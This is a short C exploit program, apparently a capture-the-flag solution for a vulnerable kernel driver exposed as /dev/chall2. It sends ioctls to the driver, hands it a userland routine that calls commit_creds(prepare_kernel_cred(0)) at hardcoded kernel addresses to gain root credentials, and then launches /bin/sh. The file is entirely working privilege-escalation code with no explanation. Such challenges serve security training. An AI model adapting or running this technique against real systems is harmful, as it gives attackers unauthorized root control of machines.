#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>


// ffffffff810b9c60 T commit_creds
// ffffffff810b9ef0 T prepare_kernel_cred


void *(*prepare_kernel_cred)(int) = 0xffffffff810b9ef0;
void (*commit_creds)(void *) = 0xffffffff810b9c60;

void shellcode(){
    commit_creds(prepare_kernel_cred(0));
}

int main(){
    char buf[100];
    int fd = open("/dev/chall2", O_RDWR);

    for(int i=0; i<10; i++){
        ioctl(fd, 0xc0fe ,buf);
       // printf("Got: %s\n", buf);
    }

    void *region = mmap(0xc0fe0000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    //memcpy(region, shellcode, 0x1000);
    printf("Executing ioctl\n");
    ioctl(fd, 0xbabe, shellcode);
    printf("Uid = %d\nOpening shell\n", getuid());
    system("/bin/sh");
}
    
